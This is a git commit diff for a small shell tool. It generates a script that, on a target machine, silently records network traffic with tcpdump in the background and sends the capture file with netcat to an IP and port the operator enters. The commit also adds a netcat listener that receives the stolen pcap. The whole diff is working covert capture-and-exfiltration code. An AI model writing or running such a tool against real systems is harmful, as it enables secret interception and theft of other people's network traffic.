eb70c548a067c2c0c4090d39eb33b0e1e71fa407
Sobanggg <abolfazleshghi1385@gmail.com>
2024-06-02 04:49:54 -0400

    add a listener

---
+++ README.md
@@ -0,0 +1,1 @@
+#simple capture data with tcpdump
--- starter.sh
+++ starter.sh
@@ -7,12 +7,19 @@ read -p "enter your ip : " ip
 read -p "enter the port for send file : " port
 read -p "enter the captureData name (.sh): " name
 read -p "enter the time for recive (Second) : " rTime
-
+read -p "enter the name file saved in target : " tName
 cat << EOF > ./$name
 #!/bin/bash
 
         {
-        timeout $rTime tcpdump -w  ./..1
-        nc -w 3 $ip $port < ./..1
+        timeout $rTime tcpdump -w  ./$tName
+        nc -w 3 $ip $port < ./$tName
         } > /dev/null 2>&1 &
 EOF
+
+cat << EOF > ./listener.sh
+#!/bin/bash
+        nc  -l -p $port > capture.pcap
+EOF
+
+
